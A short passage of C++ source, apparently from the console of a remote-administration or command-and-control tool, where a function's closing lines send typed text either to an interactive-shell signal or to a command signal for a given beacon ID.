            emit ishellInput(beacon_id_, text);
        }
        return;
    }
    emit commandEntered(beacon_id_, text);
}

}
